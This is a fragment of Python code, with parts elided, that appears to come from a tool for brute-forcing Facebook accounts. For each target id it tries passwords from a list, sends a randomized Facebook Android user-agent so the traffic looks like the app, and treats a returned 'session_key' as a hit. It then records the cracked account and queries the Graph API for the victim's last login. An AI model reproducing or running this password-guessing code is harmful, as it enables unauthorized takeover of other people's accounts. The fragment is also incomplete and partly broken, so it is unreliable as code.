...
def last_login(ids4):
    ...
    url = f"https://graph.facebook.com/{ids4}?fields=last_seen&access_token={token}"
    headers1 = {
...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/337.0.0.15.175;[FBAN/Orca-Android;FBAV/251.0.0.14.170;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/396116327;FBCR/TNT;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X620;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"
                        ...
                        if 'session_key' in po:
                                        ...
                                        print("Last Login: ", last_login(ids4))
                                        oks.append(ids)
                                        ids2.append(ids)
                                        ids4.append(ids)
                                        break
